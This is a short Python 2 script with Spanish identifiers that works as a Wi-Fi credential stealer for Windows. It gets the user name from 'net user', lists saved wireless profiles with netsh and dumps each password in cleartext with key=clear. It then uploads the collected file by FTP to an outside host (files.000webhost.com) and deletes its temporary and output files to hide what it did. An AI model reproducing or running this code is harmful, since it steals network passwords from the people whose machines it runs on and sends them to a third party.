import os,subprocess,ftplib

global nombreArchivo

def profileUser():
	global nombreArchivo

	computerUser = open ('usuario.txt','w')
	subprocess.call(['net','user'],stdout=computerUser)
	computerUser.close()
	leer = open('usuario.txt','r')
	linea = leer.readlines()
	usuario = linea[1]
	nombre = usuario[20:]
	nombreArchivo = nombre.rstrip() + ".txt"
	


def redes():
	networksId = open('networks.txt','w')
	passwords = open('passes.txt','w+')
	subprocess.call(['netsh','wlan','show','profile'],stdout=networksId)
	networksId.close()
	leer = open('networks.txt','r')
	linea = leer.readlines()
	index = 9
	while index < 50 : 
		try:
			networkName = linea[index]
			profileName0 = networkName[27:]
			profileName = profileName0.rstrip()
			sacarContrasena(profileName)
			index = index + 1
		except (IndexError):
			break


def sacarContrasena(nombreDeRed):
	global nombreArchivo
	dataPassword = open('passwords.txt','w')
	subprocess.call(['netsh','wlan','show','profile','name=',nombreDeRed,'key=clear'],stdout=dataPassword)
	dataPassword.close()
	leer = open('passwords.txt','r')
	linea = leer.readlines()
	leer.close()
	if linea[30] == "    Cipher                 : Unknown\n":
		data = nombreDeRed + linea[32] 
	else:
		data = nombreDeRed + linea[30] 
	archivoDatos = open(nombreArchivo,'a')
	archivoDatos.write(data)
	archivoDatos.close()
	subirAFTP()


def subirAFTP():
	global nombreArchivo
	archivo = nombreArchivo
	archivo_destino = archivo

	host = 'files.000webhost.com' #este es el servidor host que yo elegí
	usuarioFTP = 'username'
	passwordFTP = 'password'
	raiz = "directorioRaiz"

	try:
		s = ftplib.FTP(host,usuarioFTP,passwordFTP)
		try:
			f = open(archivo,'rb')
			s.cwd(raiz)
			s.storbinary('STOR '+ archivo_destino , f)
			f.close()
			s.quit()
		except:
			print "Error"
	except:
		print "No conection to host"


def main():
	global nombreArchivo
	profileUser()
	redes()
	subirAFTP()
	os.system("del passes.txt,passwords.txt,networks.txt,usuario.txt")
	os.system("del "+nombreArchivo)
	

main()

#http://routerpasswords.com/
